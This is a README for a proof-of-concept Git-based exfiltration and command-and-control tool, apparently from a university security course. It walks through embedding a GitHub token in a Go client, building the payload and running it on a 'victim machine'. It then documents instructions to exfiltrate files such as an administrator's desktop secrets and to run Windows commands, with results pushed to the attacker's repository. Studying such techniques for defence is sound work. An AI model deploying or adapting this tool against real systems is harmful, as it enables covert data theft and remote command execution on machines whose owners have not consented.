# Git Data Exfiltration

Git is an open source command-line tool used by developers all over the world that allows them to collaborate in groups to modify repositories of code.
With it comes a suite of APIs that enable developers to easily push or pull code from any repository.
However, this also provides attackers a potential tool for the exfiltration of data as they can use Gitâ€™s built in functionality to push files to their own repository.
This repository contains a proof-of-concept that explores the use of the Git application to communicate with and exfiltrate data into an attacker's Github repository from a compromised machine.

## Setting Up the Git payload

In order for Git exfiltration to work, we need to set up our own Git repository that we will use to exfiltrate data from and communicate with the compromised host.

1. Create a private Git repository.
1. Create a fine-grained [Personal Access Token](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token) to your repository with `Read and Write access to code`.
1. clone the repository with `git clone https://github.com/AY2223S1-CS5231-11/git-exfiltrate.git`
1. Modify the code in `Client.go`:
    1. Switch the `AUTH.Username` variable to your Github email.
    1. Switch the `AUTH.Password` variable to your created Github Personal Access Token.
    1. Switch the `REPOSITORY` variable to your created Github `.git` HTTPS repository url.
1. Commit a file called `instructions`.
    - You may enter commands into the `instructions` file to be executed when the payload is executed.
1. Run `go build` in the `client` directory.
1. Execute the created payload in your victim machine.

## Commands

There are two commands that can be executed in the victim machine.
1. `exfil "<path to file>"`
    - e.g. `exfil "C:\Users\Administrator\Desktop\Secret.txt"`.
1. `cmd <Windows Command Prompt Command>`
    - e.g. `cmd "dir %USERPROFILE%"`
1. Also, comments can be added with the `#` character.
    - e.g. `# This is a comment.`

Commands should be newline seperated and will be executed in sequence from top to bottom.
Your results will be stored in a new branch created by the victim machine. The branch name would be a unique machine ID that was generated by [this](https://github.com/denisbrodbeck/machineid) repository.
- Example `instructions` file:
```
# This is a comment
exfil "C:\Users\Administrator\Desktop\Secret.txt"
cmd "dir %USERPROFILE%"
```

## Results Format

Results are stored with a random string appeneded. This is to prevent results from a new exfiltration or execution from overwrting an older one.

- exfil results will be saved in chunks of `1024` bytes named `<file path><random string><part number>`.
    - The size of the chunks can be modified by changing the `FILE_SIZE` variable.
- command output will be returned as a single file named `<command executed><random string>`.


## Target Requirements

- The target machine must have `git` installed and have access to `https:\\github.com`.
- They can be running any machine but the `cmd` command would only work on Windows machines.


## Possible Improvements

### Supporting more Operating Systems

A simple check can be done for the Operating System before deciding what shell process to spawn. However, due to time limitations and the target system being Windows, the program only supports Windows commands.

### Error Handling

As this is a simple POC, there has been little error handling built in with any error possibly crashing the process. This may include errors such as the file attempting to be exfiltrated not existing. Hence, handling all errors seperately is another possible feature that can be implemented.
